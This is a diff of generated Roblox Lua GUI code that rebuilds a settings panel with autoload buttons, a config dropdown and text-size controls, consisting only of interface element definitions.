--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload
-G2L["a8"] = Instance.new("Frame", G2L["3e"]);
-G2L["a8"]["BorderSizePixel"] = 0;
-G2L["a8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a8"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["a8"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["a8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a8"]["Name"] = [[removeautoload]];
-G2L["a8"]["LayoutOrder"] = 8;
-G2L["a8"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button
-G2L["a9"] = Instance.new("TextButton", G2L["a8"]);
-G2L["a9"]["BorderSizePixel"] = 0;
-G2L["a9"]["TextTransparency"] = 1;
-G2L["a9"]["TextSize"] = 14;
-G2L["a9"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["a9"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["a9"]["ZIndex"] = 49;
-G2L["a9"]["BackgroundTransparency"] = 1;
-G2L["a9"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["a9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["a9"]["Name"] = [[button]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.UIPadding
-G2L["aa"] = Instance.new("UIPadding", G2L["a9"]);
-G2L["aa"]["PaddingTop"] = UDim.new(0, 2);
-G2L["aa"]["PaddingRight"] = UDim.new(0, 3);
-G2L["aa"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["aa"]["PaddingBottom"] = UDim.new(0, 2);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame
-G2L["ab"] = Instance.new("Frame", G2L["a9"]);
-G2L["ab"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["ab"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["ab"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["ab"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["ab"]["Name"] = [[buttonFrame]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.outlineStroke
-G2L["ac"] = Instance.new("UIStroke", G2L["ab"]);
-G2L["ac"]["Thickness"] = 2;
-G2L["ac"]["Name"] = [[outlineStroke]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.buttonFade
-G2L["ad"] = Instance.new("CanvasGroup", G2L["ab"]);
-G2L["ad"]["BorderSizePixel"] = 0;
-G2L["ad"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["ad"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ad"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["ad"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ad"]["Name"] = [[buttonFade]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.buttonFrame.buttonFade.UIGradient
-G2L["ae"] = Instance.new("UIGradient", G2L["ad"]);
-G2L["ae"]["Rotation"] = 90;
-G2L["ae"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.text
-G2L["af"] = Instance.new("TextLabel", G2L["a9"]);
-G2L["af"]["ZIndex"] = 2;
-G2L["af"]["BorderSizePixel"] = 0;
-G2L["af"]["TextSize"] = 14;
-G2L["af"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["af"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["af"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["af"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["af"]["BackgroundTransparency"] = 1;
-G2L["af"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["af"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["af"]["Text"] = [[Remove autoload]];
-G2L["af"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.button.text.text
-G2L["b0"] = Instance.new("UIStroke", G2L["af"]);
-G2L["b0"]["Name"] = [[text]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.removeautoload.fillbar
-G2L["b1"] = Instance.new("Frame", G2L["a8"]);
-G2L["b1"]["ZIndex"] = 90;
-G2L["b1"]["BorderSizePixel"] = 0;
-G2L["b1"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["b1"]["Size"] = UDim2.new(0, 0, 1, 0);
-G2L["b1"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b1"]["Name"] = [[fillbar]];
-G2L["b1"]["BackgroundTransparency"] = 0.95;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside
-G2L["b2"] = Instance.new("Frame", G2L["3b"]);
-G2L["b2"]["BorderSizePixel"] = 0;
-G2L["b2"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["b2"]["Size"] = UDim2.new(0, 176, 0, 255);
-G2L["b2"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
-G2L["b2"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b2"]["Name"] = [[leftside]];
-G2L["b2"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.UIListLayout
-G2L["b3"] = Instance.new("UIListLayout", G2L["b2"]);
-G2L["b3"]["Padding"] = UDim.new(0, 5);
-G2L["b3"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab
-G2L["b4"] = Instance.new("Frame", G2L["b2"]);
-G2L["b4"]["BorderSizePixel"] = 0;
-G2L["b4"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
-G2L["b4"]["Size"] = UDim2.new(0, 176, 0, 160);
-G2L["b4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b4"]["Name"] = [[uisettingsTab]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.uisettingsScript
-G2L["b5"] = Instance.new("LocalScript", G2L["b4"]);
-G2L["b5"]["Name"] = [[uisettingsScript]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT
-G2L["b6"] = Instance.new("Frame", G2L["b4"]);
-G2L["b6"]["ZIndex"] = 99;
-G2L["b6"]["BorderSizePixel"] = 0;
-G2L["b6"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["b6"]["Size"] = UDim2.new(1, 0, 0, 4);
-G2L["b6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b6"]["Name"] = [[ACCENT]];
-G2L["b6"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT.GuiColor
-G2L["b7"] = Instance.new("Frame", G2L["b6"]);
-G2L["b7"]["ZIndex"] = 99;
-G2L["b7"]["BorderSizePixel"] = 0;
-G2L["b7"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["b7"]["Size"] = UDim2.new(0, 174, 0, 2);
-G2L["b7"]["Position"] = UDim2.new(0, 1, 0, 1);
-G2L["b7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["b7"]["Name"] = [[GuiColor]];
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.ACCENT.GuiColor.UICorner
-G2L["b8"] = Instance.new("UICorner", G2L["b7"]);
-
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.UIListLayout
-G2L["b9"] = Instance.new("UIListLayout", G2L["b4"]);
-G2L["b9"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
-G2L["b9"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE
-G2L["ba"] = Instance.new("Frame", G2L["b4"]);
-G2L["ba"]["ZIndex"] = 99;
-G2L["ba"]["BorderSizePixel"] = 0;
-G2L["ba"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["ba"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["ba"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["ba"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ba"]["Name"] = [[TITLE]];
-G2L["ba"]["BackgroundTransparency"] = 1;
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text
-G2L["bb"] = Instance.new("TextLabel", G2L["ba"]);
-G2L["bb"]["TextWrapped"] = true;
-G2L["bb"]["ZIndex"] = 99;
-G2L["bb"]["BorderSizePixel"] = 0;
-G2L["bb"]["TextSize"] = 14;
-G2L["bb"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["bb"]["TextTransparency"] = 0.3;
-G2L["bb"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["bb"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["bb"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["bb"]["BackgroundTransparency"] = 1;
-G2L["bb"]["Size"] = UDim2.new(0, 172, 0, 15);
-G2L["bb"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["bb"]["Text"] = [[UI Settings]];
-G2L["bb"]["Name"] = [[text]];
-G2L["bb"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
-
-
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text.text
-G2L["bc"] = Instance.new("UIStroke", G2L["bb"]);
+G2L["bc"] = Instance.new("TextLabel", G2L["b6"]);
+G2L["bc"]["ZIndex"] = 2;
+G2L["bc"]["BorderSizePixel"] = 0;
+G2L["bc"]["TextSize"] = 14;
+G2L["bc"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bc"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bc"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["bc"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["bc"]["BackgroundTransparency"] = 1;
+G2L["bc"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["bc"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["bc"]["Text"] = [[Set as autoload]];
 G2L["bc"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.TITLE.text.UIPadding
-G2L["bd"] = Instance.new("UIPadding", G2L["bb"]);
-G2L["bd"]["PaddingLeft"] = UDim.new(0, 1);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.button.text.text
+G2L["bd"] = Instance.new("UIStroke", G2L["bc"]);
+G2L["bd"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.greystroke
-G2L["be"] = Instance.new("UIStroke", G2L["b4"]);
-G2L["be"]["ZIndex"] = 99;
-G2L["be"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["be"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["be"]["Name"] = [[greystroke]];
-G2L["be"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.setautoload.fillbar
+G2L["be"] = Instance.new("Frame", G2L["b5"]);
+G2L["be"]["ZIndex"] = 90;
+G2L["be"]["BorderSizePixel"] = 0;
+G2L["be"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["be"]["Size"] = UDim2.new(0, 0, 1, 0);
+G2L["be"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["be"]["Name"] = [[fillbar]];
+G2L["be"]["BackgroundTransparency"] = 0.95;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize
-G2L["bf"] = Instance.new("Frame", G2L["b4"]);
-G2L["bf"]["ZIndex"] = 99;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext
+G2L["bf"] = Instance.new("Frame", G2L["6c"]);
 G2L["bf"]["BorderSizePixel"] = 0;
 G2L["bf"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["bf"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["bf"]["Size"] = UDim2.new(1, 0, 0, 20);
 G2L["bf"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
 G2L["bf"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["bf"]["Name"] = [[textsize]];
-G2L["bf"]["LayoutOrder"] = 11;
+G2L["bf"]["Name"] = [[autoloadtext]];
+G2L["bf"]["LayoutOrder"] = 10;
 G2L["bf"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button
-G2L["c0"] = Instance.new("TextButton", G2L["bf"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text
+G2L["c0"] = Instance.new("TextLabel", G2L["bf"]);
+G2L["c0"]["TextWrapped"] = true;
+G2L["c0"]["ZIndex"] = 10;
 G2L["c0"]["BorderSizePixel"] = 0;
-G2L["c0"]["TextTransparency"] = 1;
 G2L["c0"]["TextSize"] = 14;
-G2L["c0"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c0"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["c0"]["TextYAlignment"] = Enum.TextYAlignment.Top;
 G2L["c0"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["c0"]["ZIndex"] = 99;
+G2L["c0"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c0"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["c0"]["BackgroundTransparency"] = 1;
-G2L["c0"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["c0"]["Size"] = UDim2.new(1, 0, 1.18729, 0);
 G2L["c0"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["c0"]["Name"] = [[button]];
+G2L["c0"]["Text"] = [[Autoload: none]];
+G2L["c0"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.UIPadding
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text.UIPadding
 G2L["c1"] = Instance.new("UIPadding", G2L["c0"]);
 G2L["c1"]["PaddingTop"] = UDim.new(0, 2);
-G2L["c1"]["PaddingRight"] = UDim.new(0, 3);
-G2L["c1"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["c1"]["PaddingBottom"] = UDim.new(0, 2);
+G2L["c1"]["PaddingRight"] = UDim.new(0, 6);
+G2L["c1"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame
-G2L["c2"] = Instance.new("Frame", G2L["c0"]);
-G2L["c2"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["c2"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["c2"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["c2"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["c2"]["Name"] = [[sliderFrame]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.autoloadtext.text.text
+G2L["c2"] = Instance.new("UIStroke", G2L["c0"]);
+G2L["c2"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.outlineStroke
-G2L["c3"] = Instance.new("UIStroke", G2L["c2"]);
-G2L["c3"]["Thickness"] = 2;
-G2L["c3"]["Name"] = [[outlineStroke]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown
+G2L["c3"] = Instance.new("Frame", G2L["6c"]);
+G2L["c3"]["BorderSizePixel"] = 0;
+G2L["c3"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c3"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["c3"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["c3"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c3"]["Name"] = [[configlistdropdown]];
+G2L["c3"]["LayoutOrder"] = 7;
+G2L["c3"]["BackgroundTransparency"] = 1;
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.buttonFade
-G2L["c4"] = Instance.new("CanvasGroup", G2L["c2"]);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button
+G2L["c4"] = Instance.new("TextButton", G2L["c3"]);
 G2L["c4"]["BorderSizePixel"] = 0;
+G2L["c4"]["TextTransparency"] = 1;
+G2L["c4"]["TextSize"] = 14;
+G2L["c4"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
 G2L["c4"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c4"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c4"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["c4"]["ZIndex"] = 89;
+G2L["c4"]["BackgroundTransparency"] = 1;
 G2L["c4"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["c4"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["c4"]["Name"] = [[buttonFade]];
+G2L["c4"]["Name"] = [[button]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.buttonFade.UIGradient
-G2L["c5"] = Instance.new("UIGradient", G2L["c4"]);
-G2L["c5"]["Rotation"] = 90;
-G2L["c5"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.UIPadding
+G2L["c5"] = Instance.new("UIPadding", G2L["c4"]);
+G2L["c5"]["PaddingTop"] = UDim.new(0, 2);
+G2L["c5"]["PaddingRight"] = UDim.new(0, 3);
+G2L["c5"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["c5"]["PaddingBottom"] = UDim.new(0, 2);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.sliderFrame.fillbar
-G2L["c6"] = Instance.new("Frame", G2L["c2"]);
-G2L["c6"]["ZIndex"] = 5;
-G2L["c6"]["BorderSizePixel"] = 0;
-G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["c6"]["Size"] = UDim2.new(0.5, 0, 1, 0);
-G2L["c6"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["c6"]["Name"] = [[fillbar]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame
+G2L["c6"] = Instance.new("Frame", G2L["c4"]);
+G2L["c6"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["c6"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["c6"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["c6"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["c6"]["Name"] = [[dropdownFrame]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.text
-G2L["c7"] = Instance.new("TextLabel", G2L["c0"]);
-G2L["c7"]["ZIndex"] = 2;
-G2L["c7"]["BorderSizePixel"] = 0;
-G2L["c7"]["TextSize"] = 14;
-G2L["c7"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c7"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c7"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["c7"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c7"]["BackgroundTransparency"] = 1;
-G2L["c7"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["c7"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["c7"]["Text"] = [[X/X]];
-G2L["c7"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.outlineStroke
+G2L["c7"] = Instance.new("UIStroke", G2L["c6"]);
+G2L["c7"]["Thickness"] = 2;
+G2L["c7"]["Name"] = [[outlineStroke]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsize.button.text.text
-G2L["c8"] = Instance.new("UIStroke", G2L["c7"]);
-G2L["c8"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.buttonFade
+G2L["c8"] = Instance.new("CanvasGroup", G2L["c6"]);
+G2L["c8"]["BorderSizePixel"] = 0;
+G2L["c8"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["c8"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c8"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["c8"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["c8"]["Name"] = [[buttonFade]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL
-G2L["c9"] = Instance.new("Frame", G2L["b4"]);
-G2L["c9"]["ZIndex"] = 99;
-G2L["c9"]["BorderSizePixel"] = 0;
-G2L["c9"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["c9"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["c9"]["Position"] = UDim2.new(0, 0, 0.11875, 0);
-G2L["c9"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["c9"]["Name"] = [[textsizeLABEL]];
-G2L["c9"]["LayoutOrder"] = 10;
-G2L["c9"]["BackgroundTransparency"] = 1;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.dropdownFrame.buttonFade.UIGradient
+G2L["c9"] = Instance.new("UIGradient", G2L["c8"]);
+G2L["c9"]["Rotation"] = 90;
+G2L["c9"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text
-G2L["ca"] = Instance.new("TextLabel", G2L["c9"]);
-G2L["ca"]["TextWrapped"] = true;
-G2L["ca"]["ZIndex"] = 99;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text
+G2L["ca"] = Instance.new("TextLabel", G2L["c4"]);
+G2L["ca"]["ZIndex"] = 2;
 G2L["ca"]["BorderSizePixel"] = 0;
 G2L["ca"]["TextSize"] = 14;
 G2L["ca"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["ca"]["TextStrokeColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["ca"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["ca"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
 G2L["ca"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["ca"]["BackgroundTransparency"] = 1;
 G2L["ca"]["Size"] = UDim2.new(1, 0, 1, 0);
 G2L["ca"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["ca"]["Text"] = [[Text Size:]];
+G2L["ca"]["Text"] = [[--]];
 G2L["ca"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text.UIPadding
-G2L["cb"] = Instance.new("UIPadding", G2L["ca"]);
-G2L["cb"]["PaddingLeft"] = UDim.new(0, 6);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text.text
+G2L["cb"] = Instance.new("UIStroke", G2L["ca"]);
+G2L["cb"]["Name"] = [[text]];
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.textsizeLABEL.text.text
-G2L["cc"] = Instance.new("UIStroke", G2L["ca"]);
-G2L["cc"]["Name"] = [[text]];
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.text.UIPadding
+G2L["cc"] = Instance.new("UIPadding", G2L["ca"]);
+G2L["cc"]["PaddingLeft"] = UDim.new(0, 6);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize
-G2L["cd"] = Instance.new("Frame", G2L["b4"]);
-G2L["cd"]["ZIndex"] = 99;
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.arrow
+G2L["cd"] = Instance.new("TextButton", G2L["c4"]);
 G2L["cd"]["BorderSizePixel"] = 0;
+G2L["cd"]["TextSize"] = 12;
+G2L["cd"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
 G2L["cd"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["cd"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["cd"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["cd"]["Name"] = [[guisize]];
-G2L["cd"]["LayoutOrder"] = 1;
+G2L["cd"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["cd"]["ZIndex"] = 99;
 G2L["cd"]["BackgroundTransparency"] = 1;
+G2L["cd"]["Size"] = UDim2.new(0, 25, 1, 0);
+G2L["cd"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["cd"]["Text"] = [[▲]];
+G2L["cd"]["Name"] = [[arrow]];
+G2L["cd"]["Rotation"] = 180;
+G2L["cd"]["Position"] = UDim2.new(1, -25, 0, 0);
 
 
--- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.leftside.uisettingsTab.guisize.UIPadding
-G2L["ce"] = Instance.new("UIPadding", G2L["cd"]);
-G2L["ce"]["PaddingLeft"] = UDim.new(0, 2);
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Settings.rightside.configTab.configlistdropdown.button.search
